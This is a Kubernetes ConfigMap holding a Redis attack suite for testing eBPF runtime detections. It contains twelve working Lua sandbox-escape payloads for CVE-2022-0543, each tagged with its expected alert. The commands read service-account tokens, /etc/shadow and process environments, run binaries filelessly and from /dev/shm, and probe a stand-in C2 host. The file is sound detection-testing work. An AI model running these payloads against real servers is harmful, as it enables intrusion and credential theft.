# Pinned copy of upstream k8sstormcenter/bob@68fbfb83dc63f4e0184ecbf66d9c5f251a74b0b7
# example/redis-attacks.yaml (Apache-2.0 licensed), wrapped as a ConfigMap so
# the bobctl-attack Job can mount it at /suite/redis-attacks.yaml. The bobctl
# CLI consumes this file via its --attack-suite flag (it is NOT a Kubernetes
# CRD, it is a bobctl-internal manifest).
#
# yamllint disable rule:line-length
# Attack payloads embed inline Lua/perl one-liners that intentionally fit on
# one source line so the strings the eBPF detector sees match the upstream
# expectedDetections fixture verbatim; breaking them changes the payload.
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: bob-suite-attack
  namespace: redis
data:
  redis-attacks.yaml: |
    apiVersion: bobctl.k8sstormcenter.io/v1alpha1
    kind: AttackSuite
    metadata:
      name: redis-full-attack-suite
      description: >-
        Comprehensive Redis attack suite (12 attacks) targeting a vulnerable
        Redis 7.2.10 instance with CVE-2022-0543 (Lua sandbox escape via
        package.loadlib / io.popen). Each attack has inline expectedDetections
        for precise per-attack alert attribution via the AlertLedger.
    target:
      service: redis
      namespace: redis
      port: 6379
      protocol: redis

    attacks:
      # ─── Attack 1: Fileless Execution via memfd_create (R1005) ───────────────
      - name: fileless-memfd-exec
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local cmd = "perl -e 'my $n=\"bob\\0\";my $fd=syscall(319,$n,0);die if $fd<0;open(my $s,\"<:raw\",\"/bin/cat\");open(my $d,\">&=\",$fd);binmode $d;my $b;while(read($s,$b,8192)){print $d $b}close $s;exec{\"/proc/self/fd/$fd\"}\"cat\",\"/etc/hostname\"'"
            local f = io_mod.popen(cmd)
            if not f then return 'popen_failed' end
            local out = f:read('*a')
            f:close()
            return 'fileless:' .. out
        successIndicators:
          - responseContains: "fileless:"
        expectedDetections:
          - attackType: fileless
            ruleID: R1005
            ruleName: "Fileless execution detected"
            containerName: redis

      # ─── Attack 2: SA Token Exfiltration (R0006) ────────────────────────────
      - name: sa-token-exfil
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token')
            local out = f:read('*a')
            f:close()
            return out
        successIndicators:
          - responseContains: "eyJ"
        expectedDetections:
          - attackType: fileless
            ruleID: R0006
            ruleName: "Unexpected service account token access"
            containerName: redis
            command: cat

      # ─── Attack 3: Sensitive File Access /etc/shadow (R0010) ─────────────────
      - name: read-etc-shadow
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted')
            local out = f:read('*a')
            f:close()
            return 'shadow:' .. out
        successIndicators:
          - responseContains: "shadow_attempted"
        expectedDetections:
          - attackType: fileless
            ruleID: R0010
            ruleName: "Unexpected Sensitive File Access"
            containerName: redis
            command: cat

      # ─── Attack 4: Unexpected Process - whoami (R0001) ───────────────────────
      - name: unexpected-process-whoami
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('whoami')
            local out = f:read('*a')
            f:close()
            return 'user:' .. out
        successIndicators:
          - responseContains: "user:"
        expectedDetections:
          - attackType: fileless
            ruleID: R0001
            ruleName: "Unexpected process launched"
            containerName: redis
            command: whoami

      # ─── Attack 5: DNS Anomaly - resolve evil domain (R0005) ─────────────────
      - name: dns-anomaly-evil-domain
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done')
            local out = f:read('*a')
            f:close()
            return 'dns:' .. out
        successIndicators:
          - responseContains: "dns:"
        expectedDetections:
          - attackType: fileless
            ruleID: R0005
            ruleName: "DNS Anomalies in container"
            containerName: redis

      # ─── Attack 6: Drifted Binary Execution (R1001) ─────────────────────────
      - name: drifted-binary-exec
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis')
            local out = f:read('*a')
            f:close()
            return 'drifted:' .. out
        successIndicators:
          - responseContains: "drifted:"
        expectedDetections:
          - attackType: fileless
            ruleID: R1001
            ruleName: "Drifted process executed"
            containerName: redis
            command: drifted_redis

      # ─── Attack 7: Execution from /dev/shm (R1000) ──────────────────────────
      - name: exec-from-devshm
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious')
            local out = f:read('*a')
            f:close()
            return 'shm:' .. out
        successIndicators:
          - responseContains: "shm:"
        expectedDetections:
          - attackType: fileless
            ruleID: R1000
            ruleName: "Process executed from malicious source"
            containerName: redis

      # ─── Attack 8: Read /proc/*/environ (R0008) ─────────────────────────────
      - name: read-proc-environ
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | head -3 || echo no_environ')
            local out = f:read('*a')
            f:close()
            return 'environ:' .. out
        successIndicators:
          - responseContains: "environ:"
        expectedDetections:
          - attackType: fileless
            ruleID: R0008
            ruleName: "Read Environment Variables from procfs"
            containerName: redis
            command: cat

      # ─── Attack 9: Symlink over /etc/shadow (R1010) ─────────────────────────
      - name: symlink-etc-shadow
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1 && cat /tmp/shadow_link 2>/dev/null; rm -f /tmp/shadow_link')
            local out = f:read('*a')
            f:close()
            return 'symlink:' .. out
        successIndicators:
          - responseContains: "symlink:"
        expectedDetections:
          - attackType: fileless
            ruleID: R1010
            ruleName: "Soft link created over sensitive file"
            containerName: redis

      # ─── Attack 10: Crypto Mining Domain DNS (R1008) ────────────────────────
      - name: crypto-mining-dns
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done')
            local out = f:read('*a')
            f:close()
            return 'mining_dns:' .. out
        successIndicators:
          - responseContains: "mining_dns:"
        expectedDetections:
          - attackType: fileless
            ruleID: R1008
            ruleName: "Crypto Mining Domain Communication"
            containerName: redis

      # ─── Attack 11: Reverse Shell Attempt via Perl HTTP (R0001 + R0005) ─────
      - name: reverse-shell-perl-http
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen("perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"connected\" : \"connect_failed\";' 2>&1; echo perl_http_done")
            local out = f:read('*a')
            f:close()
            return 'revshell:' .. out
        successIndicators:
          - responseContains: "revshell:"
        expectedDetections:
          - attackType: fileless
            ruleID: R0001
            ruleName: "Unexpected process launched"
            containerName: redis
            command: perl
          - attackType: fileless
            ruleID: R0005
            ruleName: "DNS Anomalies in container"
            containerName: redis

      # ─── Attack 12: Credential Harvesting via /etc/passwd + id (R0001) ──────
      - name: credential-harvest-passwd
        type: fileless
        redis:
          eval: |
            local io_mod = nil
            pcall(function()
              if type(io) == 'table' and io.popen then io_mod = io end
            end)
            if not io_mod then
              pcall(function()
                local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
                if loader then io_mod = loader() end
              end)
            end
            if not io_mod then return 'sandbox_blocked' end
            local f = io_mod.popen("awk -F: '$3==0{print $1}' /etc/passwd && id 2>&1")
            local out = f:read('*a')
            f:close()
            return 'creds:' .. out
        successIndicators:
          - responseContains: "creds:root"
        expectedDetections:
          - attackType: fileless
            ruleID: R0001
            ruleName: "Unexpected process launched"
            containerName: redis
            command: awk
